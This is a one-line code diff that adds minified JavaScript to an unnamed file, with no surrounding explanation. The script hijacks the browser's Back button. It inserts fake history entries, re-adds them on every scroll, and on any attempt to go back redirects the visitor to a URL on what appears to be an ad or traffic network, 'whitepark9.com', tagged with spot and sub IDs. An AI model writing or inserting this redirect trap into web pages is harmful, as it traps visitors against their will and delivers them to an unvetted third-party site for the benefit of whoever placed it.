@@ -1,0 +1,1 @@
+const targetDirectDisableBack="https://whitepark9.com/in/p/?spot_id=405608&cat=9&sub_id=1272277716";history.pushState(null,document.title,window.location.href),window.addEventListener("popstate",function(t){window.location.href=targetDirectDisableBack}),window.addEventListener("scroll",function(){history.pushState(null,document.title,window.location.href)});
